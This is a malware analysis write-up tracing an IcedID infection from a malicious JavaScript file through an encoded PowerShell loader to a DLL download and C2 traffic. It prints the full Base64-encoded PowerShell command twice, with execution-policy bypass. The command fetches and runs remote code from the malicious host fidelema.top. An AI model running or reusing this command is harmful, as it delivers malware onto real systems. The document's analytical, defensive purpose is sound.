## **Preamble**

While reviewing telemetry data I identified Base64-encoded strings during the execution of Powershell.

![[/Untitled 541.png|Untitled 541.png]]

![[/Untitled 1 7.png|Untitled 1 7.png]]

## **Analysis**

Upon execution of a malicious JavaScript associated with the IcedID infection, it calls the command interpreter to execute a base64 encoded Windows PowerShell. The PowerShell then communicates outbound to an IcedID redirect domain, followed by a download of a malicious [DLL](https://en.wikipedia.org/wiki/Dynamic-link_library) file. Next, the PowerShell executes the downloaded DLL using the Rundll process. And finally, the DLL is launches a Command and Control (C2) client that generates traffic with IcedID C2 server.

![[/Untitled 2 7.png|Untitled 2 7.png]]

## **Loader phase**

While analyzing the Powershell command I decoded the Base-64 encoded strings.

```PowerShell
poWershell  -ep bypasS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZgBpAGQAZQBsAGUAbQBhAC4AdABvAHAALwBnAGEAdABlAGYAMQAuAHAAaABwACIAKQA=
```

![[/Untitled 3 7.png|Untitled 3 7.png]]

This scripts retrieves a file from the URL `hxxp[://]fidelema[.]top/gatef1[.]php`

Searching for information about the URL I founded that it is a new one.  
  

![[/Untitled 4 7.png|Untitled 4 7.png]]

![[/Untitled 5 6.png|Untitled 5 6.png]]

![[/Untitled 6 5.png|Untitled 6 5.png]]

  

==`(ObjectCMD)`== `poWershell -ep bypasS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZgBpAGQAZQBsAGUAbQBhAC4AdABvAHAALwBnAGEAdABlAGYAMQAuAHAAaABwACIAKQA=`

==`(parentCMD)`== `"C:\Windows\System32\WScript.exe" "C:\Users\ADMINISTRATIVO\Downloads\Doc.js”`

  

Looking through the detections I saw the dll file

![[/Untitled 7 5.png|Untitled 7 5.png]]

`hxxp[://]fidelema[.]top/dll/27[.]dll`

![[/Untitled 8 5.png|Untitled 8 5.png]]

Aditional proof

[https://tria.ge/230317-zvpcdaaa46](https://tria.ge/230317-zvpcdaaa46)

[https://blogs.opentext.com/dissecting-icedid-behavior-on-an-infected-endpoint/](https://blogs.opentext.com/dissecting-icedid-behavior-on-an-infected-endpoint/)

[https://github.com/pr0xylife/IcedID/blob/main/icedID_17.03.2023.txt](https://github.com/pr0xylife/IcedID/blob/main/icedID_17.03.2023.txt)

[https://urlhaus.abuse.ch/browse/tag/IcedID/](https://urlhaus.abuse.ch/browse/tag/IcedID/)